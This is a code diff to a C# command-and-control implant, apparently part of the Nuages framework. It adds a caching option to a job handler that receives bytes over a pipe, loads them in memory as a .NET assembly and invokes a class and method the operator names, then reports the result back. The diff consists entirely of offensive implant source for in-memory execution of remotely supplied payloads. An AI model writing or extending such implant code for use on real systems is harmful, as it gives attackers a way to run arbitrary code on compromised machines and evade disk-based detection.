@@ -177,7 +177,7 @@ namespace NuagesSharpImplant
                 return (errorText);
             }
         }
-       
+      
         public void ExecuteJob(JsonObject job)
         {
             string jobId = job["_id"];
@@ -334,6 +334,7 @@ namespace NuagesSharpImplant
                     string pipe_id = job["payload"]["options"]["pipe_id"];
                     int length = (int)job["payload"]["options"]["length"];
                     string file_id = job["payload"]["options"]["file_id"];
+                    string cache = job["payload"]["options"]["cache"];
                     Assembly assembly;
                     string[] strarr = arguments.Split(',');
                     string result = "";
@@ -353,11 +354,13 @@ namespace NuagesSharpImplant
                         }
                         typearr[i] = argarr[i].GetType();
                     }
-                    if (this.assemblies.ContainsKey(file_id)) {
+                    if (cache.ToLower() == "true") { Console.WriteLine("Caching is enabled"); } else { Console.WriteLine("Caching is Disabled"); }
+                    if (this.assemblies.ContainsKey(file_id) && cache.ToLower() == "true") {
                         assembly = this.assemblies[file_id];
                     } else {
                         byte[] buffer = this.connector.PipeRead(pipe_id, length);
                         assembly = Assembly.Load(buffer);
+                        if (cache.ToLower() == "true") { this.assemblies[file_id] = assembly; }
                     }
                     result = assembly.GetType(clas).GetMethod(method, typearr).Invoke(0, argarr).ToString();
                     SubmitJobResult(jobId, result, false);
